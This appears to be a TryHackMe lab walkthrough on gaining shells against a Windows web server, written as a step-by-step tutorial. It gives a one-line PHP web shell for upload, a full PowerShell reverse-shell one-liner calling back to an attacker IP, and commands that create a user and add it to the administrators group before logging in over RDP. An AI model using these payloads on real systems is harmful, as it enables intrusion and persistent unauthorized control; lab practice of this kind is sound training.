Now lets start the machine form the **TASK 15** and see what is has to offer to use..

**NOTE: As this is a THM task so there wont be any firewall blocking in real life scenarios it wont be this easy for sure!!**
# USING SIMPLE PHP SCRIPT
![Screenshot 2023-11-18 132628](https://github.com/Theincognitomode/What-the-shell/assets/73027020/2358218e-d63f-4e0e-bfbc-e5f964f45978)



The website look something like this..

Now lets create a simple PHP script and upload it on the website

    <?php echo "<pre>" .shell_exec($_GET["cmd"]). "</pre>"; ?>


Now lets visit the /upload/fname (in my case fname = revshell.php)
![Screenshot 2023-11-18 132853](https://github.com/Theincognitomode/What-the-shell/assets/73027020/42b1a494-b726-4b66-a963-b6b657336851)


Open the listern on any port that you desire..


Now lets look at this git repo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

From here we will be using the powershell one liner script in order to get a rev shell


    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.17.61.124',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Chnage the ip address and port accordingly..

Now convert this in url form and then modify the url 

    http://10.10.109.254/uploads/revshell.php?cmd=<whole script that has been converted into url using any url encoder>


![Screenshot 2023-11-18 133437](https://github.com/Theincognitomode/What-the-shell/assets/73027020/73c0ebfd-21ba-4307-b5a8-a200869b1c96)


There we goo!! 

Now read the Questions of TASK 13 

**The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.**

Lets do this simple commands:


        net user <uname> <password> /add

Now lets add the user in the administrator group:

        net localgrouup administrators <uname> /add

After completing this proccess lets try to access it using the xfreerdp the command for that will look like this:

        xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.109.254 /u:abc /p:'abc123'

![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/2ca970b9-bf12-4576-bb96-0317f8bba194)


Cool we are connected now!!
